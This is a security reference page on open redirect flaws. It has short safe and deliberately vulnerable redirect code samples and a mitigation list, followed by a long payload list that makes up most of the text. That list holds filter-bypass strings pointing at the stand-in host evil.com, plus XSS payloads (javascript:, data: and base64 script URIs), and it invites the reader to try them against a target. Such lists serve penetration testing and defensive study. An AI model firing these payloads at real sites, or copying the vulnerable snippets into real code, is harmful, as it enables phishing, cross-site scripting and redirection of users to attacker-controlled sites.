# Open Redirect Payloads List

Unvalidated URL redirects and forwards occur when a web application accepts untrusted input that could redirect users to a malicious site. This vulnerability can enable phishing attacks by making malicious links appear trustworthy, as they may include the legitimate server’s name. Attackers could also bypass access controls to access restricted functionality.

# Safe Redirection Examples:
Below are examples of secure redirection practices where the destination URL is hardcoded and not influenced by user input.

### Java
```bash
response.sendRedirect("https://secure-site.com");
```

### PHP
```bash
<?php
header("Location: https://secure-site.com");
?>
```

### ASP.NET
```bash
Response.Redirect("~/dashboard/home.aspx");
```

### Ruby on Rails
```bash
redirect_to dashboard_path
```

# Vulnerable Redirection Examples:
The following examples illustrate unsafe redirection practices that accept unvalidated user input.

## Vulnerable Example 1: Direct Parameter Use

### Java 
```bash
response.sendRedirect(request.getParameter("redirect"));
```

### PHP 
```bash
<?php
$redirect = $_GET['redirect'];
header("Location: $redirect");
?>
```

### ASP.NET 
```bash
string redirect = Request.QueryString["redirect"];
Response.Redirect(redirect);
```

### Ruby on Rails
```bash
redirect_to params[:redirect]
```
These examples are vulnerable because they use unvalidated user input (e.g., redirect parameter) for the redirect URL. An attacker could craft a URL like:
```bash
https://trusted-site.com/redirect?redirect=https://malicious-site.com
```
This could trick users into visiting a malicious site while appearing to originate from a trusted domain.

## Vulnerable Example 2: ASP.NET MVC Example

In older ASP.NET MVC applications (e.g., MVC 1 or 2), the following login action is vulnerable to open redirection:
```bash
[HttpPost]
public ActionResult Login(LoginModel model, string redirectUrl)
{
    if (ModelState.IsValid)
    {
        if (AuthService.ValidateUser(model.UserName, model.Password))
        {
            FormsAuthService.SignIn(model.UserName, model.RememberMe);
            if (!string.IsNullOrEmpty(redirectUrl))
            {
                return Redirect(redirectUrl);
            }
            return RedirectToAction("Home", "Dashboard");
        }
        ModelState.AddModelError("", "Invalid credentials.");
    }
    return View(model);
}
```
Here, redirectUrl is not validated, allowing an attacker to redirect users to a malicious site after login.

## Mitigating Open Redirection Vulnerabilities
To prevent unvalidated redirects and forwards, consider the following strategies:
1. Avoid Redirects When Possible: Eliminate redirects unless necessary.
2. Hardcode Destinations: Use predefined URLs instead of user input.
3. Validate Input: If user input is required, validate the URL against a predefined allowlist of trusted domains or paths.
4. Map URLs to Identifiers: Instead of accepting full URLs, map user input to a server-side identifier that resolves to a safe URL.
5. Sanitize Input: Use a regex or allowlist to ensure only trusted URLs are used (e.g., ^https://(secure-site\.com|another-trusted-site\.com)/.*$).
6. Confirmation Page: Redirect users to an intermediary page that warns them they are leaving the site and requires confirmation to proceed.

## Recommendations
1. Use HTTPS: Ensure all redirects use secure protocols to prevent man-in-the-middle attacks.
2. Log Redirects: Monitor and log redirect attempts to detect suspicious activity.
3. Update Frameworks: Use modern frameworks (e.g., ASP.NET MVC 3 or later) that include built-in protections against open redirects.
4. By implementing these practices, you can significantly reduce the risk of open redirection vulnerabilities in your web application.

## Open Redirect Payload List:

### Category 1: Basic URL Prefixes & Encodings
These are the most common and effective. Try them with your target domain (evil.com, attacker.com, your-collaborator.net).
```bash
//evil.com
\\evil.com
https:evil.com
http:evil.com
//evil.com%2f.example.com
//evil.com%5c.example.com
/%2f/evil.com
/%5c/evil.com
/%2f/evil.com/
/%5c/evil.com/
http://evil.com
https://evil.com
http:/evil.com
https:/evil.com
http:/\evil.com
https:/\evil.com
http:\\evil.com
https:\\evil.com
```
### Category 2: Bypassing "Domain Whitelisting" (Using the Original Domain)
These try to use the trusted domain in a way that still redirects to yours.
```bash
example.com.evil.com (Classic domain prefix)
evil.com#example.com
evil.com?example.com
evil.com/.example.com
evil.com/example.com
example.com@evil.com (Userinfo syntax)
example.com%40evil.com (URL-encoded @)
example.com@@evil.com
example.com%20@evil.com
example.com&@evil.com
example.com#@evil.com
example.com?@evil.com
https://example.com@evil.com
https://example.com@@evil.com
https://example.com#@evil.com
https://example.com?@evil.com
example.com:80@evil.com
example.com:443@evil.com
example.com%00@evil.com (Null byte)
example.com%2500@evil.com (Double-encoded null byte)
```

### Category 3: Bypassing "Starts with /" or Relative Path Checks
These try to break out of the expected relative path.
```bash
\/evil.com
/\evil.com
\\evil.com
evil.com
/\/evil.com
/%0d/evil.com (Carriage Return)
/%0a/evil.com (Line Feed)
/%09/evil.com (Tab)
/%00/evil.com (Null byte)
//%2f%2fevil.com
/%2f%2fevil.com
..%2fevil.com
..%5cevil.com
%2e%2e%2fevil.com
%2e%2e%5cevil.com
.../evil.com
..../evil.com
....//evil.com
..;/evil.com
..;//evil.com
```
### Category 4: Protocol-Relative & Data URLs
```bash
//evil.com/x
///evil.com/x
////evil.com/x
https:/evil.com/x
http:/evil.com/x
javascript:alert(1) (Sometimes leads to XSS)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
vbscript:msgbox("XSS")
javas&#x09;cript:alert(1) (HTML encoded tab)
```
### Category 5: Using Special Characters and Bypass Tricks
```bash
example.com%2f%2fevil.com
example.com&evil.com
example.com|evil.com
example.com'evil.com
example.com"evil.com
example.comevil.com (Backtick)
example.com(evil.com)
example.com;evil.com
example.com%20evil.com
example.com%09evil.com
example.com%0aevil.com
example.com%0devil.com
example.com>evil.com
example.com<evil.com
example.com!evil.com
example.com?evil.com
example.com#evil.com
example.com%3fevil.com (Encoded ?)
example.com%23evil.com (Encoded #)
example.com/evil.com
example.com\/evil.com
example.com\\evil.com
```
### Category 6: Double Encoding
```bash
Encode key characters like /, \, :, @ twice.
http%253A%252F%252Fevil.com
%252F%252Fevil.com
%255C%255Cevil.com
example.com%2540evil.com
%252e%252e%252fevil.com
%252e%252e%255Cevil.com
```
### Category 7: Unicode Normalization & Special Characters
Some systems decode Unicode characters unexpectedly.
```bash
example.com%u002fevil.com
example.com%C0%AFevil.com (Overlong UTF-8 encoding of /)
example.com%c0%ae%c0%ae%c0%afevil.com (Overlong ../)
example.com%E3%80%82evil.com (Unicode full-width dot)
example.com%EF%BC%8Fevil.com (Unicode full-width slash)
example.com%FF%0Fevil.com
example.com%FE%0Fevil.com
```
### Category 8: Using Parameter Pollution
If the redirect parameter is checked but another isn't, try polluting.
```bash
next=allowed.com&next=evil.com
next=evil.com&next=allowed.com
next=allowed.com;evil.com
next[]=allowed.com&next[]=evil.com
next=allowed.com&otherparam=evil.com (if otherparam is used as fallback)
```
### Category 9: Bypassing "Ends with" or Domain Validation
If they check if the URL ends with .example.com.
```bash
evil.com/example.com
evil.com/example.com#
evil.com/example.com?
evil.com/example.com?param=value
evil.com/example.com#fragment
evil.com?example.com
evil.com#example.com
evil.com\.example.com (Backslash)
evil.com%2fexample.com (Encoded slash)
evil.com%5cexample.com (Encoded backslash)
evil.com%00.example.com (Null byte)
evil.com%23.example.com (Encoded #)
evil.com%3f.example.com (Encoded ?)
```
### Category 10: Advanced Bypasses (Less Common)
```bash
https://example.com\.evil.com
https://example.com[/]evil.com
https://example.com%40evil.com/
https:example.com@evil.com
https://[evil.com]/
https://example.com@evil.com:80@google.com/
https://example.com@evil.com@google.com/
https://&evil.com
https://|evil.com
https://!evil.com
https://'evil.com
https://"evil.com
https://evil.com (Backtick)
https://(evil.com)
https://;evil.com
https://%20evil.com
https://%09evil.com
https://%0aevil.com
https://%0devil.com
https://>evil.com
https://<evil.com
```
